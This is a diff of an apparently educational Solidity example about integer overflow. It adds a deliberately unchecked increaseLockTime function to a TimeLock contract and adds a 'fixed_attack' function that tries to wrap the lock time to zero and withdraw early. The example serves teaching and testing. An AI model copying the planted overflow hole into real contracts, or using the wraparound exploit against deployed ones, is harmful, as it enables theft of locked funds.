@@ -38,6 +38,9 @@ contract TimeLock {
     }
 
     function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+    function safeMath_increaseLockTime(uint _secondsToIncrease) public {
         lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
     }
 
@@ -62,6 +65,22 @@ contract ArimeticOverflowAttack {
 
     fallback() external payable {}
 
+
+     function fixed_attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0
+        so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
+        */
+        timeLock.safeMath_increaseLockTime(
+            type(uint).max + 1- timeLock.lockTime(address(this))
+        );
+        timeLock.withdraw();
+    }
+ 
     function attack() public payable {
         timeLock.deposit{value: msg.value}();
         /*
